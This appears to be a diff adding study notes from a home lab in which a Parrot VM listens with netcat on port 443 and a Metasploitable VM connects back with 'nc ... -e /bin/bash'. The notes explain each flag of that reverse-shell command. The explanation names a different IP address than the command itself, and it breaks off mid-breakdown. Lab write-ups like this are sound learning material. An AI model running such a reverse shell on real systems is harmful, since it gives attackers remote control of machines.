@@ -1,1 +1,19 @@
+command from VM 1(parrot) nc -nlvp 443 
 
+break down each part:
+nc: This is the command itself, short for Netcat. 
+-n: This option stands for numeric-only. It tells nc to prevent DNS resolution of hostnames. This means if you provide a hostname instead of an IP address, nc will not try to look up its IP address. This can be useful in situations where DNS is not working or when you specifically want to work with IP addresses directly.
+-l: This option puts nc into listen mode. Instead of trying to connect to a remote host, nc will listen for incoming connections on the specified port. This turns your machine into a basic network server on that port.
+-v: This option enables verbose output. nc will provide more detailed information about what it's doing, such as when a connection is established or closed. This can be helpful for debugging and understanding the connection process.
+-p 443: This option specifies the port number that nc should listen on. In this case, it's port 443. Port 443 is the standard port for HTTPS (Hypertext Transfer Protocol Secure), which is used for secure web communication (usually encrypted with TLS/SSL)
+
+in summary it creates a simple, unencrypted TCP listener on port 443 of your Linux machine, providing verbose output and skipping DNS resolution. It's useful for basic connection testing and manual data exchange but lacks the security features expected on port 443 for standard web traffic.
+
+
+command from VM 2(metasploitable) nc 192.168.229.100 443 -e /bin/bash is a potentially dangerous command used to establish a reverse shell to the IP address 192.168.229.100 on port 443. 
+
+break down each part:
+nc: This is the Netcat command, the versatile network utility.
+192.168.100.123: This is the target IP address that the nc command on the current machine will attempt to connect to.
+443: This is the port number on the target machine (192.168.100.123) that the nc command will try to establish a TCP connection with. Port 443 is commonly associated with HTTPS (secure web traffic).
+-e /bin/bash: This is the most critical and potentially dangerous part of the command. The -e option in Netcat is used to execute a specified command once a connection is established. In this case, /bin/bash is the path to the Bash shell executable.
